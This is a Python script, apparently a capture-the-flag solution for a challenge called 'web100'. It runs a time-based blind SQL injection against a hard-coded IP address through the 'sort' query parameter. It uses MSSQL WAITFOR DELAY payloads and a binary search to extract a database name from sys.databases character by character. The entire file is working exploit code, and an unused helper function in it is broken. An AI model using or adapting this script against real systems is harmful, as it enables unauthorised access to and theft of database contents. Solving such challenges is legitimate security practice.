# import woanmeo11
import requests

URL = 'http://167.172.85.253/web100/?sort='

def check(pos, op, c):
    payload = f"1 IF(ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases WHERE database_id > 4),{pos},1)) {op} {c}) WAITFOR DELAY '0:0:5' %00"
    r = requests.get(URL + payload)
    print('time:', r.elapsed.seconds, end=' ')
    return r.elapsed.seconds >= 5
    
def binsearch(pos):
    low = 32
    high = 128
    while high - low > 1:
        mid = low + high >> 1
        if check(pos, '>=', mid):
            low = mid
            print(f'pos {pos}: {chr(mid)} oce')
        else:
            high = mid
            print(f'pos: {pos} {chr(mid)} !')
    return low if check(pos, '=', low) else None

def solve(pos):
    c = binsearch(pos + 1)
    if c:
        print('c:', c)
        key[pos] = chr(c)
        print(''.join(key))

key = ''

found = False
while not found:
    found = True
    c = binsearch(len(key) + 1)
    if c:
        key += chr(c)
        print(key)
        found = False

print('key: ', key)